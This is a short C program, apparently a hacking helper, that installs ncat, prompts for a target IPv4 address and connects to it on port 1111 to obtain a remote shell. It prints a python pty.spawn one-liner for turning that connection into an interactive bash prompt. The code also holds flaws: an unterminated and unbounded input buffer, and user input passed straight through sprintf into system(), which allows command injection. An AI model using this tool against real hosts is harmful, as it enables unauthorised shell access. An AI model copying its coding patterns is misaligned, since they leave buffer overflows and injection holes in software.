//Code by 6icada
//Please do not copy code

//Adding libraries
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//Main function
int main(){
  //Adding vars
  char IPv4[15] = "255.255.255.255";
  char cmd[150];
  const int MainPort = 1111;

  //Installing tools
  //system("apt update > /dev/null");
  //system("apt upgrade > /dev/null");
  system("apt install ncat > /dev/null");

  //Choosing IPv4
  printf("Enter IPv4: ");
  scanf("%s", &IPv4);

  //Tips
  printf("\nWrite this to get bash prompt:\n");
  printf("/usr/bin/python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\n");

  //Starting Action
  sprintf(cmd, "ncat %s %d", IPv4, MainPort);
  system(cmd);

}
